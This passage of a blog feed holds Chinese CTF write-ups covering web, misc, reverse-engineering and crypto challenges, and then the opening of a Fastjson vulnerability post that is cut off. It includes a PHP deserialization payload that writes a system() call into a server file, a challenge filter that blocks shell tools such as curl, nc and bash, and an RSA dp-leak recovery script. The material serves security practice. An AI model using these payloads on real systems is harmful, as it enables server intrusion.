css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"begin"</span><span class="selector-pseudo">:4</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">32</span>:<span class="string">"b0eacc6cb3904a848106501cda4d4f25"</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"mode"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"write"</span>;<span class="attribute">s</span>:<span class="number">7</span>:<span class="string">"content"</span>;<span class="attribute">S</span>:<span class="number">35</span>:<span class="string">"&lt;?php \73ystem\28"</span>cat _f_l_a_g.php<span class="string">"\29;?&gt;"</span>;<span class="attribute">s</span>:<span class="number">6</span>:<span class="string">"choice"</span>;<span class="attribute">O</span>:<span class="number">5</span>:<span class="string">"write"</span>:<span class="number">0</span>:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后继续getflag.php，system可以用，但是直接搞flag的都被ban了，这里我们想到了php</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error<span class="constructor">_reporting(0)</span>;</span><br><span class="line">$a=$_POST<span class="literal">['<span class="identifier">a</span>']</span>;  </span><br><span class="line">$b=$_POST<span class="literal">['<span class="identifier">b</span>']</span>;</span><br><span class="line"><span class="keyword">if</span>(preg<span class="constructor">_match('<span class="operator">/</span><span class="params">cat</span>|<span class="params">more</span>|<span class="params">less</span>|<span class="params">head</span>|<span class="params">tac</span>|<span class="params">tail</span>|<span class="params">nl</span>|<span class="params">od</span>|<span class="params">vi</span>|<span class="params">sort</span>|<span class="params">cut</span>|<span class="params">ping</span>|<span class="params">curl</span>|<span class="params">nc</span>|<span class="params">grep</span>|<span class="params">system</span>|<span class="params">exec</span>|<span class="params">bash</span>|<span class="params">unique</span>|<span class="params">find</span>|<span class="params">popen</span>|<span class="params">open</span>|<span class="params">ls</span>|<span class="params">rm</span>|<span class="params">sleep</span>|<span class="params">chr</span>|<span class="params">ord</span>|<span class="params">bin</span>|<span class="params">hex</span>|<span class="params">dict</span>|#|`|\$|\&lt;|\(|\[|\]|\&#123;|\&#125;|\)</span><span class="pattern-match">|\&gt;|\<span class="constructor">_</span>|\'|"|\<span class="operator">*</span>|;|\<span class="operator">||</span>&amp;|\<span class="operator">/</span>|\\\\<span class="operator">/</span>is', <span class="constructor">$a</span>))&#123;</span></span><br><span class="line"><span class="pattern-match">    die("hack!!!!");</span></span><br><span class="line"><span class="pattern-match">&#125;</span></span><br><span class="line"><span class="pattern-match"><span class="keyword">if</span>(!preg<span class="constructor">_match('<span class="operator">/</span>[<span class="params">a</span>-<span class="params">z</span>]<span class="operator">/</span><span class="params">is</span>', $<span class="params">b</span>)</span>)</span></span><br><span class="line"><span class="pattern-match">&#123;</span></span><br><span class="line"><span class="pattern-match">    die("big hack!!!!");</span></span><br><span class="line"><span class="pattern-match">&#125;</span></span><br><span class="line"><span class="pattern-match">call<span class="constructor">_user_func($<span class="params">b</span>,$<span class="params">a</span>)</span>;</span></span><br></pre></td></tr></table></figure><p><img src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_06725f259963d8447102d0e13dce9203.png" alt></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>base64直接解？题目下线了，忘了</p><h3 id="DECODER"><a href="#DECODER" class="headerlink" title="DECODER"></a>DECODER</h3><p>三部分txt<br>flag_1.txt</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">GUZEQ3TTJVIWIQSFGVNGO5DHIVVWI</span>===</span><br><span class="line"> </span><br><span class="line"><span class="keyword">base32 </span><span class="keyword">base58 </span><span class="keyword">base85</span></span><br><span class="line"><span class="keyword"> </span></span><br><span class="line"><span class="number">042</span>f38b694</span><br></pre></td></tr></table></figure><p>flag_2.txt</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cipher：👉🦓🏎💵🕹🚪🎤🙃☂☀🌏🛩💵😇🚨🚪🎤👉🔪👣🐎✖☂🎤✉🔪😊🍎🚰🌪🚪🚹🍌🚰🎃🎤💧😎🥋🍎✖🎃👉🍵</span><br><span class="line"><span class="built_in">key</span>：👮👟👟👡👥👦</span><br></pre></td></tr></table></figure><p>base100解key，whhjno<br>emoji-aes带上密匙解密，<a href="https://aghorler.github.io/emoji-aes/" target="_blank" rel="noopener">https://aghorler.github.io/emoji-aes/</a><br>Rotation设置36，解得b52bff9568<br>flag_3.txt<br>base91解码后发现base64隐写</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># -*- codin<span class="variable">g:</span> utf-<span class="number">8</span> -*-</span><br><span class="line"> </span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"> </span><br><span class="line">with <span class="keyword">open</span>(<span class="string">'base.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> <span class="keyword">f</span>:</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">line</span> in <span class="keyword">f</span>.readlines():</span><br><span class="line">        stegb64 = <span class="string">''</span>.<span class="keyword">join</span>(<span class="built_in">line</span>.<span class="keyword">split</span>())</span><br><span class="line">        rowb64 =  <span class="string">''</span>.<span class="keyword">join</span>(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).<span class="keyword">split</span>())</span><br><span class="line"> </span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.<span class="built_in">index</span>(stegb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[-<span class="number">1</span>])-b64chars.<span class="built_in">index</span>(rowb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.<span class="built_in">count</span>(<span class="string">'='</span>) #no equalnum <span class="keyword">no</span> offset</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span>.<span class="keyword">join</span>([chr(<span class="keyword">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i in xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)]) #<span class="number">8</span> 位一组</span><br></pre></td></tr></table></figure><p>37f267472516<br>拼接添加flag{}即可</p><h3 id="huahua"><a href="#huahua" class="headerlink" title="huahua"></a>huahua</h3><p>改成zip文件头，然后补png文件头<br>直接修改高度得到flag</p><h3 id="NOISE"><a href="#NOISE" class="headerlink" title="NOISE"></a>NOISE</h3><p>out文件（010editor）直接放进AudacityPortable看频谱图<br><img src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_5422fba5157ef080e685e4610588be00.png" alt><br>调一下大小，可以直接看到flag</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="REEEE"><a href="#REEEE" class="headerlink" title="REEEE"></a>REEEE</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"> </span><br><span class="line">alpha1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span></span><br><span class="line">alpha2 = <span class="string">'RSTUVWXYZabcdefghijklmnoABCDEFGHIJKLMNOPQpqrstuvwxyz0123456789+/='</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">flag</span> = <span class="string">'BOxJB3tMeXV2dkM1BLR5A2Z3ekI2fXWLBUR0fUI2ekaMA2AzA30='</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">flag</span> = <span class="built_in">flag</span>.translate(<span class="built_in">str</span>.maketrans(alpha2, alpha1))</span><br><span class="line"> </span><br><span class="line">print(<span class="built_in">flag</span>)</span><br><span class="line">print(base64.b64decode(<span class="built_in">flag</span>))</span><br></pre></td></tr></table></figure><h3 id="HardRe"><a href="#HardRe" class="headerlink" title="HardRe"></a>HardRe</h3><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">import</span> <span class="variable">base64</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">s</span> = <span class="variable">base64.b64decode</span>(<span class="string">'c2JWblhyX0dgQnk8RHBdNWdJVW1HazZ0NHg='</span>)</span><br><span class="line"><span class="variable">ss</span> = <span class="string">''</span></span><br><span class="line"><span class="variable">for</span> <span class="variable">sss</span> <span class="variable"><span class="keyword">in</span></span> <span class="variable">s</span>[<span class="number">13</span>:]:</span><br><span class="line">    <span class="variable"><span class="keyword">if</span></span> <span class="function"><span class="title"><span class="built_in">ord</span></span>(<span class="string">'z'</span>) &gt;= <span class="variable">sss</span> ^ <span class="number">0</span><span class="variable">x5</span> &gt;= <span class="title"><span class="built_in">ord</span></span>(<span class="string">'0'</span>):</span></span><br><span class="line"><span class="function">        <span class="variable">ss</span> += <span class="title">chr</span>(<span class="variable">sss</span> ^ <span class="number">0</span><span class="variable">x5</span>)</span></span><br><span class="line">    <span class="variable"><span class="keyword">else</span></span>:</span><br><span class="line">        <span class="variable">ss</span> += <span class="function"><span class="title">chr</span>(<span class="variable">sss</span>)</span></span><br><span class="line"><span class="variable">for</span> <span class="variable">sss</span> <span class="variable"><span class="keyword">in</span></span> <span class="variable">s</span>[:<span class="number">13</span>]:</span><br><span class="line">    <span class="variable"><span class="keyword">if</span></span> <span class="function"><span class="title"><span class="built_in">ord</span></span>(<span class="string">'z'</span>) &gt;= <span class="variable">sss</span> ^ <span class="number">0</span><span class="variable">xf</span> &gt;= <span class="title"><span class="built_in">ord</span></span>(<span class="string">'0'</span>):</span></span><br><span class="line"><span class="function">        <span class="variable">ss</span> += <span class="title">chr</span>(<span class="variable">sss</span> ^ <span class="number">0</span><span class="variable">xf</span>)</span></span><br><span class="line">    <span class="variable"><span class="keyword">else</span></span>:</span><br><span class="line">        <span class="variable">ss</span> += <span class="function"><span class="title">chr</span>(<span class="variable">sss</span>)</span></span><br><span class="line"><span class="function"><span class="title">print</span>(<span class="variable">ss</span>)</span></span><br></pre></td></tr></table></figure><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h3><p>凯撒密码</p><h3 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h3><p>百度脚本直接出</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">n=<span class="number">101031799769686356875689677901727632087789394241694537610688487381734497153370779419148195361726900364384918762158954452844358699628272550435920733825528414623691447245900175499950458168333742756118038555364836309568598646312353874247656710732472018288962454506789615632015856961278964493826919853082813244227</span></span><br><span class="line">c=<span class="number">59381302046219861703693321495442496884448849866535616496729805734326661742228038342690865965545318011599241185017546760846698815333545820228348501022889423901773651749628741238050559441761853071976079031678640014602919526148731936437472217369575554448232401310265267205034644121488774398730319347479771423197</span></span><br><span class="line">dp=<span class="number">1089885100013347250801674176717862346181995027932544377293216564837464201546385463279055643089303360817423261428901834798955985043080308895369226243973673</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65538</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e<span class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">            p=((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span></span><br><span class="line">            q=n/(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)</span><br><span class="line">            phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">            d = gmpy2.invert(e,phi)%phi</span><br><span class="line">            m = pow(c,d,n)</span><br><span class="line">            print long_to_bytes(m)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;serialize&quot;&gt;&lt;a href=&quot;#serialize&quot; class=&quot;headerlink&quot; title=&quot;serialize&quot;&gt;&lt;/a&gt;serialize&lt;/h3&gt;&lt;p&gt;index.php&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;error_reporting(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;highlight_file(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Demo&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $class;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $user;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;class = &lt;span class=&quot;string&quot;&gt;&quot;safe&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;user = &lt;span class=&quot;string&quot;&gt;&quot;ctfer&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $context = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;class (&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;user);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt;($context &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; $f)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; $f;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__wakeup&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $context = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;class (&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;user);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt;($context &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; $f)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; $f;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;safe&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; $user;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($user)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;user = $user;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;hello &quot;&lt;/span&gt;.&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;user);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;data&#39;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    unserialize($_GET[&lt;span class=&quot;string&quot;&gt;&#39;data&#39;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $demo=&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Demo;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://jlkl.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson Vulnerability</title>
    <link href="https://jlkl.github.io/2021/10/29/Java_06/"/>
    <id>https://jlkl.github.io/2021/10/29/Java_06/</id>
    <published>2021-10-29T09:50:37.000Z</published>
    <updated>2021-10-29T09:55:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p><p>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p><h2 id="Fastjson组件"><a href="#Fastjson组件" class="headerlink" title="Fastjson组件"></a>Fastjson组件</h2><p>Fastjson使用包含如下几个核心函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line">String text = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span><span class="keyword">to</span><span class="constructor">JSONString(<span class="params">obj</span>)</span>;</span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">VO vo = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse<span class="literal">()</span>; <span class="comment">//解析为JSONObject类型或者JSONArray类型</span></span><br><span class="line">VO vo = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse<span class="constructor">Object(<span class="string">"&#123;...&#125;"</span>)</span>; <span class="comment">//JSON文本解析成JSONObject类型</span></span><br><span class="line">VO vo = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse<span class="constructor">Object(<span class="string">"&#123;...&#125;"</span>, VO.<span class="params">class</span>)</span>; <span class="comment">//JSON文本解析成VO.class类</span></span><br></pre></td></tr></table></figure><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>User.java</p><p>建立一个用户类，实现Setter和getter方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 